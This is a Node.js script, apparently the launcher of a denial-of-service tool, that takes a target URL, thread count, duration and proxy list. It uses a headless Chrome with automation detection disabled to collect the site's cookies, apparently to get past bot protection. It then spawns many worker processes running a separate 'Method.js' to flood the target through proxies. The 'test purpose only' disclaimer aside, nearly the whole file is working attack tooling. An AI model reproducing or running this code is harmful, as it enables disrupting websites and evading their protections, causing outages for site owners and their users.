// Author: @JuiceW2LD (V3)
// Only For Test Purpose. I Won't Accept Any Responsibility For What You Do With This Script...
// USAGE: node START.js ["URL"] [METHOD(GET-POST)] [TIME] [THREADS] [ProxyFile] Optional(%RAND%):[RAND_Length] - https://example.com/%RAND% 
// node START.js "https://example.com/%RAND%" GET 600 5 proxies.txt
// npm i chalk events request selenium-webdriver
// Don't Forget To Add chromedriver.exe Into Your Windows PATH

var TARGET;
if(process.argv[2] === undefined){
    console.log("Wrong Usage!");
    console.log("Usage: node START.js [URL(%RAND%)] [METHOD(GET-POST)] [THREADS] [TIME] [ProxyFile] Optional:[RAND_Length]");
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RAND%")){
        if(process.argv.length < 7)
        {
            console.log("Wrong Usage!");
            console.log("Usage: node START.js [URL(%RAND%)] [METHOD(GET-POST)] [THREADS] [TIME] [ProxyFile] Optional:[RAND_Length]");
            process.exit(3162);
        }
    }
}

var LENGTH = process.argv[7];

const {spawn} = require('child_process')
const chalk = require("chalk");
const EventEmitter = require('events');
const chrome = require('selenium-webdriver/chrome');
var webdriver = require('selenium-webdriver');
var BROWSER;
var INDEX_RAND;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); INDEX_RAND = TARGET.indexOf("%RAND%");}else{BROWSER = TARGET}
var METHOD = process.argv[3];
var THREADS = process.argv[4];
var TIME = process.argv[5];
var PROXIES = process.argv[6];
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });

async function GetCookies(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    console.log(chalk.blue(`Started Attack On ${TARGET} For ${TIME} Second`))
    var chromeOptions = new chrome.Options();
    chromeOptions.addArguments("--disable-blink-features=AutomationControlled");
    chromeOptions.addArguments("--disable-dev-shm-usage");
    chromeOptions.addArguments("--start-maximized");
    chromeOptions.addArguments("window-size=1920,1080");
    chromeOptions.addArguments("--disable-popup-blocking");
    chromeOptions.addArguments("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4324.104 Safari/537.36");
    chromeOptions.addArguments("--disable-infobars");
    chromeOptions.addArguments("--no-sandbox");
    chromeOptions.addArguments("--headless");
    const driver = new webdriver.Builder().forBrowser('chrome').setChromeOptions(chromeOptions).build();
    await driver.get(BROWSER).then(function(){
        console.log(chalk.red("Browsing The WebSite...."));
        driver.sleep(4000).then(async function() {
            driver.manage().getCookies().then(async function (cookies) {
                await (await driver).quit();
                for (i=0, len=cookies.length, COOKIES=""; i<len; i++){
                    COOKIES += cookies[i]['name'] + ": " + cookies[i]['value'] + "; "
                }
                console.log(chalk.green(`Got The Cookies: ${COOKIES}`));
                COOKIES = `\"${COOKIES}\"`
                for (i=0; i<THREADS; i++){
                    console.log(`Thread ${i+1} Started!`)
                    if (LENGTH === undefined){
                        spawn(process.argv[0], [ "Method.js", TARGET, METHOD, TIME, COOKIES, PROXIES]);
                    }else{
                        console.log(LENGTH)
                        spawn(process.argv[0], [ "Method.js", TARGET, METHOD, TIME, PROXIES, COOKIES, LENGTH]);
                    }
                }
            });
        });
    });
}

GetCookies();